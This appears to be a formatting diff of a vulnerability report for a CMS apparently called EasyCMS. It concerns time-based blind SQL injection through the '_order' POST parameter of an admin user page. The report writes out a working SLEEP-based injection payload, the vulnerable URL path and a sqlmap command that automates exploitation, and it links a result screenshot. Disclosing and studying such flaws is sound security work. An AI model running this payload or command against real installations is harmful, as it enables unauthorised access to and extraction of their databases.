@@ -23,14 +23,17 @@ The variable Order is not filtered and SQL injection exists.
 
 2.Payload
 URL:/index.php?s=/admin/user/index.html
+
 Payload: _order=123 AND (SELECT 8561 FROM (SELECT(SLEEP(5)))MlTU)&keyword=123&numPerPage=10&pageNum=1
+
 Parameter: _order (POST)
+
 Type: time-based blind
 
 sqlmap command:
 python sqlmap.py -r easycms.txt -batch
-result:
 
+result:
 ![图片](https://user-images.githubusercontent.com/90664154/149264277-a720fa3e-c1d2-4184-aabf-a637bb3138ad.png)
 
 
